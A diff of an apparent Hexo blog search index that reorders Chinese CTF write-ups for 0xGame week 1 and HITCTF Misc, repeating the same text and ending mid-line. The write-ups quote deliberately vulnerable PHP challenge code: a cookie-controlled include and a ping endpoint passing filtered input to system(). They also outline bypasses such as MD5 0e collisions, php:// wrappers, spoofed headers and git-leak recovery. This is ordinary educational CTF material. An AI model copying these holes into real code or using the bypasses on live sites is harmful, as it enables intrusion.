@@ -1,109 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>20230xGameWeek1-Writeup</title>
-    <url>/2023/10/24/20230xGameWeek1-Writeup/</url>
-    <content><![CDATA[<h1>20230xGameWeek1-Writeup</h1>
-<h2 id="Web">Web</h2>
-<h3 id="Sign-In">Sign In</h3>
-<p><strong>考点：f12</strong></p>
-<p>f12查看源代码，在main.js中找到flag</p>
-<p><img src="https://s2.loli.net/2023/10/19/8XbFGiRmQf6jdlk.png" alt=""></p>
-<h3 id="baby-php">baby_php</h3>
-<p><strong>考点：php特性利用</strong></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">    <span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="variable">$name</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$a</span> != <span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$c</span>) &amp;&amp; <span class="variable">$c</span> != <span class="number">1024</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$c</span>) == <span class="number">1024</span>) &#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="variable">$name</span>.<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>简单来分析解读一下，首先时读取了两个get参数a和b，一个post参数c，以及一个cookie。</p>
-<p>对于两个get参数a和b的要求时值不相等，但是md5相等，因此我们可以去了解一下MD5绕过，通过0e绕过即可过第一层。然后需要绕过is_numeric和intval。</p>
-<p>在进行以上绕过之后，还需要对最后存在一个可控cookie参数name进行进一步的利用，通过php伪协议进行读取。</p>
-<p><img src="https://s2.loli.net/2023/10/21/xp7u6a9TAWHh1zy.png" alt=""></p>
-<p>然后将结果进行解码，得到</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag = &#x27;0xGame&#123;43bb3e24-0824-48cb-95d0-c471540c0953&#125;&#x27;;</span><br><span class="line">?</span><br></pre></td></tr></table></figure>
-<h3 id="hello-http">hello_http</h3>
-<p><strong>考点：http协议</strong></p>
-<p>这题所考察的就是http相关知识</p>
-<p>第一步是传入get参数，需要传一个/?query=ctf</p>
-<img src="https://s2.loli.net/2023/10/21/LS35EKV8d9FARpv.png"  />
-<p>第二步是传入post参数，action=getflag</p>
-<p><img src="https://s2.loli.net/2023/10/21/LPm4GfCjn3X5KyQ.png" alt=""></p>
-<p>第三步是改变身份认证，在cookie参数中写入role=admin</p>
-<p><img src="https://s2.loli.net/2023/10/21/bhacRA5L9zNdr6H.png" alt=""></p>
-<p>第四步是本地ip，相关参数有X-Forwarded-For，伪造127.0.0.1</p>
-<p><img src="https://s2.loli.net/2023/10/21/w9nH8JUbxcCi4TZ.png" alt=""></p>
-<p>第五步是User-Agent，中名为用户代理，可以进行伪造HarmonyOS Browser</p>
-<p><img src="https://s2.loli.net/2023/10/21/gCNPT9rqOtJVB4o.png" alt=""></p>
-<p>第六步是Referer 请求头包含了当前请求页面的来源页面的地址，<a href="http://xn--ys-jk3c39f.mihoyo.com">传入ys.mihoyo.com</a></p>
-<p><img src="https://s2.loli.net/2023/10/21/RkzZV2cBXCnmjfx.png" alt=""></p>
-<p>最终得到flag</p>
-<p><img src="https://s2.loli.net/2023/10/21/eL257NWDcK8gAuI.png" alt=""></p>
-<h3 id="repo-leak">repo_leak</h3>
-<p><strong>考点：git泄露</strong></p>
-<p>顾名思义，这是信息泄露相关。这里所考察的是git泄露</p>
-<p>题目提示</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Using Git for version control</span><br></pre></td></tr></table></figure>
-<p>然后使用githack获取git源，使用命令查看并回退版本</p>
-<p><img src="https://s2.loli.net/2023/10/23/WhFzge2GH9yrKcX.png" alt=""></p>
-<p><img src="https://s2.loli.net/2023/10/23/YaoVBvlz9761esZ.png" alt=""></p>
-<p>最后在本地起一个http服务</p>
-<p><img src="https://s2.loli.net/2023/10/23/gyjd9ZoVWkXhJ3v.png" alt=""></p>
-<p>得到flag</p>
-<p><img src="https://s2.loli.net/2023/10/23/AYNoBeOdJs4rDcF.png" alt=""></p>
-<h3 id="ping">ping</h3>
-<p><strong>考点：Bypass</strong></p>
-<p>首先f12在源码中找到提示</p>
-<p><img src="https://s2.loli.net/2023/10/23/oj6R4OdAN83pgCV.png" alt=""></p>
-<p>打开api.php得到</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">function sanitize($s) &#123;</span><br><span class="line">    $s = str_replace(&#x27;;&#x27;, &#x27;&#x27;, $s);</span><br><span class="line">    $s = str_replace(&#x27; &#x27;, &#x27;&#x27;, $s);</span><br><span class="line">    $s = str_replace(&#x27;/&#x27;, &#x27;&#x27;, $s);</span><br><span class="line">    $s = str_replace(&#x27;flag&#x27;, &#x27;&#x27;, $s);</span><br><span class="line">    return $s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;source&#x27;])) &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (!isset($_POST[&#x27;ip&#x27;])) &#123;</span><br><span class="line">    die(&#x27;No IP Address&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ip = $_POST[&#x27;ip&#x27;];</span><br><span class="line"></span><br><span class="line">$ip = sanitize($ip);</span><br><span class="line"></span><br><span class="line">if (!preg_match(&#x27;/((\d&#123;1,2&#125;|1\d\d|2[0-4]\d|25[0-5])\.)&#123;3&#125;(\d&#123;1,2&#125;|1\d\d|2[0-4]\d|25[0-5])/&#x27;, $ip)) &#123;</span><br><span class="line">    die(&#x27;Invalid IP Address&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">system(&#x27;ping -c 4 &#x27;.$ip. &#x27; 2&gt;&amp;1&#x27;);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>这里使用function封装了一个单元，将使用sanitize函数replace了一些字符</p>
-<p>同时使用了preg_match 会匹配⼀个 IP 的正则表达式，需要绕过</p>
-<p>前端做的部分限制，可以通过bp抓包绕过</p>
-<p><img src="https://s2.loli.net/2023/10/23/4xbqaRCzc8r9vWA.png" alt=""></p>
-<h3 id="相关知识点总结">相关知识点总结</h3>
-<ol>
-<li>F12查看源代码</li>
-<li>md5绕过</li>
-<li>is_numeric函数，intval() 函数绕过</li>
-<li>php伪协议</li>
-<li>http参数相关</li>
-<li>git泄露</li>
-</ol>
-<h2 id="Misc">Misc</h2>
-<h3 id="SignIn">SignIn</h3>
-<p>两次编码转换</p>
-<p><img src="https://s2.loli.net/2023/10/24/Pzn3UJwAL1iBgYl.png" alt=""></p>
-<h3 id="重生之我在教学楼打cs">重生之我在教学楼打cs</h3>
-<p>这题没意思，看看就行</p>
-<h3 id="shark-shark">shark shark</h3>
-<p>打开是一个流量包，仔细观察可以找到一个长度很大的tcp流</p>
-<p><img src="https://s2.loli.net/2023/10/24/ndDvtlF7IgkQNsr.png" alt=""></p>
-<p>追踪可以看到504B开头，明显是一个压缩包</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">504b0304140009000800017e3b573440eb40380000002c00000008000000666c61672e74787474f54e6e559873f67e32d14b6572f12401b92b622d75b576fd8e73fcb0f080c8d232420e19a36ac5d6852ca66d16ba25b8727e2e42d21889504b07083440eb40380000002c000000504b01021f00140009000800017e3b573440eb40380000002c000000080024000000000000002000000000000000666c61672e7478740a00200000000000010018000d740af216f1d90156fc2fa417f1d90195872fa417f1d901504b050600000000010001005a0000006e0000000000</span><br></pre></td></tr></table></figure>
-<p>十六进制导入010，得到压缩包，发现需要密码</p>
-<p><img src="https://s2.loli.net/2023/10/24/Rj81PYvGXHImFfc.png" alt="https://s2.loli.net/2023/10/24/Rj81PYvGXHImFfc.png"></p>
-<p>追踪其他tcp流得到密码</p>
-<img src="https://s2.loli.net/2023/10/24/ioUgQ7XmBPlZIS8.png" style="zoom:67%;" />
-<p>打开压缩包得到flag</p>
-<img src="https://s2.loli.net/2023/10/24/w8zIivrHjVlmLN5.png" style="zoom:67%;" />
-<h3 id="hide-and-seek">hide and seek</h3>
-<p>使用stegseek弱口令爆破得到</p>
-<p><img src="https://s2.loli.net/2023/10/26/M2oHPUlO9wqg4BZ.png" alt=""></p>
-<h3 id="least-and-most">least and most</h3>
-<p>分别使用了lsb（最低有效位）和msb（最高有效位）</p>
-<h2 id="Reverse">Reverse</h2>
-<h3 id="数字筑基">数字筑基</h3>
-<p>这题考察的就是二进制转换为十六进制</p>
-<p><img src="https://s2.loli.net/2023/10/23/bHcE4uajoyhAfGp.png" alt=""></p>
-<h3 id="代码金丹">代码金丹</h3>
-<p>用ida打开后，f5反编译得到flag</p>
-<p><img src="https://s2.loli.net/2023/10/24/lNXt5HA74hDCI21.png" alt=""></p>
-]]></content>
-      <categories>
-        <category>Writeup</category>
-      </categories>
-      <tags>
-        <tag>0xGame</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>2023 SYCGeekchallenge-Writeup-Misc</title>
     <url>/2023/12/02/2023%20SYCGeekchallenge-Writeup-Misc/</url>
     <content><![CDATA[<h1>2023 SYCGeekchallenge-Writeup-Misc</h1>
@@ -208,6 +105,109 @@
       </tags>
   </entry>
   <entry>
+    <title>20230xGameWeek1-Writeup</title>
+    <url>/2023/10/24/20230xGameWeek1-Writeup/</url>
+    <content><![CDATA[<h1>20230xGameWeek1-Writeup</h1>
+<h2 id="Web">Web</h2>
+<h3 id="Sign-In">Sign In</h3>
+<p><strong>考点：f12</strong></p>
+<p>f12查看源代码，在main.js中找到flag</p>
+<p><img src="https://s2.loli.net/2023/10/19/8XbFGiRmQf6jdlk.png" alt=""></p>
+<h3 id="baby-php">baby_php</h3>
+<p><strong>考点：php特性利用</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">    <span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="variable">$name</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$a</span> != <span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$c</span>) &amp;&amp; <span class="variable">$c</span> != <span class="number">1024</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$c</span>) == <span class="number">1024</span>) &#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="variable">$name</span>.<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>简单来分析解读一下，首先时读取了两个get参数a和b，一个post参数c，以及一个cookie。</p>
+<p>对于两个get参数a和b的要求时值不相等，但是md5相等，因此我们可以去了解一下MD5绕过，通过0e绕过即可过第一层。然后需要绕过is_numeric和intval。</p>
+<p>在进行以上绕过之后，还需要对最后存在一个可控cookie参数name进行进一步的利用，通过php伪协议进行读取。</p>
+<p><img src="https://s2.loli.net/2023/10/21/xp7u6a9TAWHh1zy.png" alt=""></p>
+<p>然后将结果进行解码，得到</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag = &#x27;0xGame&#123;43bb3e24-0824-48cb-95d0-c471540c0953&#125;&#x27;;</span><br><span class="line">?</span><br></pre></td></tr></table></figure>
+<h3 id="hello-http">hello_http</h3>
+<p><strong>考点：http协议</strong></p>
+<p>这题所考察的就是http相关知识</p>
+<p>第一步是传入get参数，需要传一个/?query=ctf</p>
+<img src="https://s2.loli.net/2023/10/21/LS35EKV8d9FARpv.png"  />
+<p>第二步是传入post参数，action=getflag</p>
+<p><img src="https://s2.loli.net/2023/10/21/LPm4GfCjn3X5KyQ.png" alt=""></p>
+<p>第三步是改变身份认证，在cookie参数中写入role=admin</p>
+<p><img src="https://s2.loli.net/2023/10/21/bhacRA5L9zNdr6H.png" alt=""></p>
+<p>第四步是本地ip，相关参数有X-Forwarded-For，伪造127.0.0.1</p>
+<p><img src="https://s2.loli.net/2023/10/21/w9nH8JUbxcCi4TZ.png" alt=""></p>
+<p>第五步是User-Agent，中名为用户代理，可以进行伪造HarmonyOS Browser</p>
+<p><img src="https://s2.loli.net/2023/10/21/gCNPT9rqOtJVB4o.png" alt=""></p>
+<p>第六步是Referer 请求头包含了当前请求页面的来源页面的地址，<a href="http://xn--ys-jk3c39f.mihoyo.com">传入ys.mihoyo.com</a></p>
+<p><img src="https://s2.loli.net/2023/10/21/RkzZV2cBXCnmjfx.png" alt=""></p>
+<p>最终得到flag</p>
+<p><img src="https://s2.loli.net/2023/10/21/eL257NWDcK8gAuI.png" alt=""></p>
+<h3 id="repo-leak">repo_leak</h3>
+<p><strong>考点：git泄露</strong></p>
+<p>顾名思义，这是信息泄露相关。这里所考察的是git泄露</p>
+<p>题目提示</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Using Git for version control</span><br></pre></td></tr></table></figure>
+<p>然后使用githack获取git源，使用命令查看并回退版本</p>
+<p><img src="https://s2.loli.net/2023/10/23/WhFzge2GH9yrKcX.png" alt=""></p>
+<p><img src="https://s2.loli.net/2023/10/23/YaoVBvlz9761esZ.png" alt=""></p>
+<p>最后在本地起一个http服务</p>
+<p><img src="https://s2.loli.net/2023/10/23/gyjd9ZoVWkXhJ3v.png" alt=""></p>
+<p>得到flag</p>
+<p><img src="https://s2.loli.net/2023/10/23/AYNoBeOdJs4rDcF.png" alt=""></p>
+<h3 id="ping">ping</h3>
+<p><strong>考点：Bypass</strong></p>
+<p>首先f12在源码中找到提示</p>
+<p><img src="https://s2.loli.net/2023/10/23/oj6R4OdAN83pgCV.png" alt=""></p>
+<p>打开api.php得到</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">function sanitize($s) &#123;</span><br><span class="line">    $s = str_replace(&#x27;;&#x27;, &#x27;&#x27;, $s);</span><br><span class="line">    $s = str_replace(&#x27; &#x27;, &#x27;&#x27;, $s);</span><br><span class="line">    $s = str_replace(&#x27;/&#x27;, &#x27;&#x27;, $s);</span><br><span class="line">    $s = str_replace(&#x27;flag&#x27;, &#x27;&#x27;, $s);</span><br><span class="line">    return $s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;source&#x27;])) &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (!isset($_POST[&#x27;ip&#x27;])) &#123;</span><br><span class="line">    die(&#x27;No IP Address&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ip = $_POST[&#x27;ip&#x27;];</span><br><span class="line"></span><br><span class="line">$ip = sanitize($ip);</span><br><span class="line"></span><br><span class="line">if (!preg_match(&#x27;/((\d&#123;1,2&#125;|1\d\d|2[0-4]\d|25[0-5])\.)&#123;3&#125;(\d&#123;1,2&#125;|1\d\d|2[0-4]\d|25[0-5])/&#x27;, $ip)) &#123;</span><br><span class="line">    die(&#x27;Invalid IP Address&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">system(&#x27;ping -c 4 &#x27;.$ip. &#x27; 2&gt;&amp;1&#x27;);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>这里使用function封装了一个单元，将使用sanitize函数replace了一些字符</p>
+<p>同时使用了preg_match 会匹配⼀个 IP 的正则表达式，需要绕过</p>
+<p>前端做的部分限制，可以通过bp抓包绕过</p>
+<p><img src="https://s2.loli.net/2023/10/23/4xbqaRCzc8r9vWA.png" alt=""></p>
+<h3 id="相关知识点总结">相关知识点总结</h3>
+<ol>
+<li>F12查看源代码</li>
+<li>md5绕过</li>
+<li>is_numeric函数，intval() 函数绕过</li>
+<li>php伪协议</li>
+<li>http参数相关</li>
+<li>git泄露</li>
+</ol>
+<h2 id="Misc">Misc</h2>
+<h3 id="SignIn">SignIn</h3>
+<p>两次编码转换</p>
+<p><img src="https://s2.loli.net/2023/10/24/Pzn3UJwAL1iBgYl.png" alt=""></p>
+<h3 id="重生之我在教学楼打cs">重生之我在教学楼打cs</h3>
+<p>这题没意思，看看就行</p>
+<h3 id="shark-shark">shark shark</h3>
+<p>打开是一个流量包，仔细观察可以找到一个长度很大的tcp流</p>
+<p><img src="https://s2.loli.net/2023/10/24/ndDvtlF7IgkQNsr.png" alt=""></p>
+<p>追踪可以看到504B开头，明显是一个压缩包</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">504b0304140009000800017e3b573440eb40380000002c00000008000000666c61672e74787474f54e6e559873f67e32d14b6572f12401b92b622d75b576fd8e73fcb0f080c8d232420e19a36ac5d6852ca66d16ba25b8727e2e42d21889504b07083440eb40380000002c000000504b01021f00140009000800017e3b573440eb40380000002c000000080024000000000000002000000000000000666c61672e7478740a00200000000000010018000d740af216f1d90156fc2fa417f1d90195872fa417f1d901504b050600000000010001005a0000006e0000000000</span><br></pre></td></tr></table></figure>
+<p>十六进制导入010，得到压缩包，发现需要密码</p>
+<p><img src="https://s2.loli.net/2023/10/24/Rj81PYvGXHImFfc.png" alt="https://s2.loli.net/2023/10/24/Rj81PYvGXHImFfc.png"></p>
+<p>追踪其他tcp流得到密码</p>
+<img src="https://s2.loli.net/2023/10/24/ioUgQ7XmBPlZIS8.png" style="zoom:67%;" />
+<p>打开压缩包得到flag</p>
+<img src="https://s2.loli.net/2023/10/24/w8zIivrHjVlmLN5.png" style="zoom:67%;" />
+<h3 id="hide-and-seek">hide and seek</h3>
+<p>使用stegseek弱口令爆破得到</p>
+<p><img src="https://s2.loli.net/2023/10/26/M2oHPUlO9wqg4BZ.png" alt=""></p>
+<h3 id="least-and-most">least and most</h3>
+<p>分别使用了lsb（最低有效位）和msb（最高有效位）</p>
+<h2 id="Reverse">Reverse</h2>
+<h3 id="数字筑基">数字筑基</h3>
+<p>这题考察的就是二进制转换为十六进制</p>
+<p><img src="https://s2.loli.net/2023/10/23/bHcE4uajoyhAfGp.png" alt=""></p>
+<h3 id="代码金丹">代码金丹</h3>
+<p>用ida打开后，f5反编译得到flag</p>
+<p><img src="https://s2.loli.net/2023/10/24/lNXt5HA74hDCI21.png" alt=""></p>
+]]></content>
+      <categories>
+        <category>Writeup</category>
+      </categories>
+      <tags>
+        <tag>0xGame</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>2023Ciscn-Writeup</title>
     <url>/2023/09/28/2023Ciscn-Writeup/</url>
     <content><![CDATA[<h1>2023Ciscn-Writeup</h1>
@@ -288,6 +288,58 @@
       </categories>
       <tags>
         <tag>ciscn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2023HITCTF-Misc-Writeup</title>
+    <url>/2023/11/30/2023HITCTF-Misc-Writeup/</url>
+    <content><![CDATA[<h1>2023HITCTF-Misc-Writeup</h1>
+<h2 id="前言">前言</h2>
+<p>希望自己下次能有更大的贡献，太菜啦，哭哭（</p>
+<p><img src="https://s2.loli.net/2024/01/01/We3CjlQpxTPSgcK.png" alt=""></p>
+<h2 id="leftover-file">leftover file</h2>
+<p><strong>考点：Modbus协议，变异凯撒</strong></p>
+<p>首先查看了一下，发现是modbus协议相关，检查了一下相关功能码</p>
+<p><img src="https://s2.loli.net/2023/11/30/pUu1vYTSV2F8Gwe.png" alt=""></p>
+<p>发现response存在异常</p>
+<p><img src="https://s2.loli.net/2023/11/30/6vpOtLGRNk7WuCS.png" alt=""></p>
+<p><img src="https://s2.loli.net/2023/11/30/9aefbxp7ENLOMd1.png" alt="">尝试根据flag头寻找相关规律</p>
+<p><img src="https://s2.loli.net/2023/11/30/vkmWO1qZ74jMobi.png" alt=""></p>
+<p>然后每次的功能码3，进行一次新的修改操作</p>
+<p><img src="https://s2.loli.net/2023/11/30/GMP5fUcgob2DmRV.png" alt=""></p>
+<p><img src="https://s2.loli.net/2023/11/30/K1mdlh3nTRjkWJe.png" alt=""></p>
+<p><img src="https://s2.loli.net/2023/11/30/27M6IRgJvsZUCxy.png" alt=""></p>
+<p>到90 93发现flag已经格式完整</p>
+<p>完整exp：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c = [<span class="number">71</span>, <span class="number">71</span>, <span class="number">81</span>, <span class="number">63</span>, <span class="number">79</span>, <span class="number">64</span>, <span class="number">43</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">41</span>, <span class="number">112</span>, <span class="number">65</span>, <span class="number">35</span>, <span class="number">86</span>, <span class="number">83</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">77</span>, <span class="number">96</span>, <span class="number">91</span>, <span class="number">74</span>, <span class="number">93</span>, <span class="number">88</span>, <span class="number">71</span>, <span class="number">90</span>, <span class="number">85</span>, <span class="number">68</span>, <span class="number">73</span>, <span class="number">68</span>, <span class="number">85</span>, <span class="number">90</span>, <span class="number">93</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">c, x</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(c[i] + i + x) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c))])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find</span>(<span class="params">c</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">        decrypted = decrypt(c, i)</span><br><span class="line">        <span class="keyword">if</span> decrypted.startswith(<span class="string">&quot;HIT&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> i, decrypted</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line">x, flag = find(c)</span><br><span class="line"><span class="keyword">if</span> x :</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;flag: <span class="subst">&#123;x&#125;</span>: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2023/11/30/rz5YT8Ai2fogaIu.png" alt=""></p>
+<p>这是仅完成的一题，剩下的是根据官方wp的思路来学习的</p>
+<p>单纯菜，qwq~~</p>
+<h2 id="network-in-network">network-in-network</h2>
+<p><strong>考点：神经网络逆向</strong></p>
+<p>先来看一下官方给的</p>
+<p><img src="https://s2.loli.net/2023/11/30/3IeufHGkZVx2Bdw.png" alt=""></p>
+<p>我再研究研究，qwq</p>
+<h2 id="H1F1">H1F1</h2>
+<p><strong>考点：音频反向</strong></p>
+<p>这道题就讲一下思路吧，不想动手复现了</p>
+<p>根据官方wp和吉大师傅的简单操作了一下</p>
+<p><a href="https://mp.weixin.qq.com/s/O14tELa2JCkhJUPA7RNfRw">2023HITCTF wp (qq.com)</a></p>
+<p>只能说学到了一个新的知识：音频diff</p>
+<p>首先根据峰值将两端音频对齐，然后对其中一段音频反向</p>
+<p>可以发现下图的怪异bit点</p>
+<p><img src="https://s2.loli.net/2023/11/30/hvCyXY5inZpN6fS.png" alt=""></p>
+<p>进行读取二进制0和1，最后转字符串就行了</p>
+<h2 id="总结">总结</h2>
+<p>都什么年代了，哪还有什么传统Misc啊（乐</p>
+<p>还有这次比赛的web也确实让人有一种脑干缺失的美</p>
+<p>出题人太懂出题了（悲</p>
+]]></content>
+      <categories>
+        <category>Writeup</category>
+      </categories>
+      <tags>
+        <tag>HITCTF</tag>
       </tags>
   </entry>
   <entry>
@@ -468,58 +520,6 @@
       </tags>
   </entry>
   <entry>
-    <title>2023HITCTF-Misc-Writeup</title>
-    <url>/2023/11/30/2023HITCTF-Misc-Writeup/</url>
-    <content><![CDATA[<h1>2023HITCTF-Misc-Writeup</h1>
-<h2 id="前言">前言</h2>
-<p>希望自己下次能有更大的贡献，太菜啦，哭哭（</p>
-<p><img src="https://s2.loli.net/2024/01/01/We3CjlQpxTPSgcK.png" alt=""></p>
-<h2 id="leftover-file">leftover file</h2>
-<p><strong>考点：Modbus协议，变异凯撒</strong></p>
-<p>首先查看了一下，发现是modbus协议相关，检查了一下相关功能码</p>
-<p><img src="https://s2.loli.net/2023/11/30/pUu1vYTSV2F8Gwe.png" alt=""></p>
-<p>发现response存在异常</p>
-<p><img src="https://s2.loli.net/2023/11/30/6vpOtLGRNk7WuCS.png" alt=""></p>
-<p><img src="https://s2.loli.net/2023/11/30/9aefbxp7ENLOMd1.png" alt="">尝试根据flag头寻找相关规律</p>
-<p><img src="https://s2.loli.net/2023/11/30/vkmWO1qZ74jMobi.png" alt=""></p>
-<p>然后每次的功能码3，进行一次新的修改操作</p>
-<p><img src="https://s2.loli.net/2023/11/30/GMP5fUcgob2DmRV.png" alt=""></p>
-<p><img src="https://s2.loli.net/2023/11/30/K1mdlh3nTRjkWJe.png" alt=""></p>
-<p><img src="https://s2.loli.net/2023/11/30/27M6IRgJvsZUCxy.png" alt=""></p>
-<p>到90 93发现flag已经格式完整</p>
-<p>完整exp：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c = [<span class="number">71</span>, <span class="number">71</span>, <span class="number">81</span>, <span class="number">63</span>, <span class="number">79</span>, <span class="number">64</span>, <span class="number">43</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">41</span>, <span class="number">112</span>, <span class="number">65</span>, <span class="number">35</span>, <span class="number">86</span>, <span class="number">83</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">77</span>, <span class="number">96</span>, <span class="number">91</span>, <span class="number">74</span>, <span class="number">93</span>, <span class="number">88</span>, <span class="number">71</span>, <span class="number">90</span>, <span class="number">85</span>, <span class="number">68</span>, <span class="number">73</span>, <span class="number">68</span>, <span class="number">85</span>, <span class="number">90</span>, <span class="number">93</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">c, x</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(c[i] + i + x) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c))])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find</span>(<span class="params">c</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">        decrypted = decrypt(c, i)</span><br><span class="line">        <span class="keyword">if</span> decrypted.startswith(<span class="string">&quot;HIT&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> i, decrypted</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line">x, flag = find(c)</span><br><span class="line"><span class="keyword">if</span> x 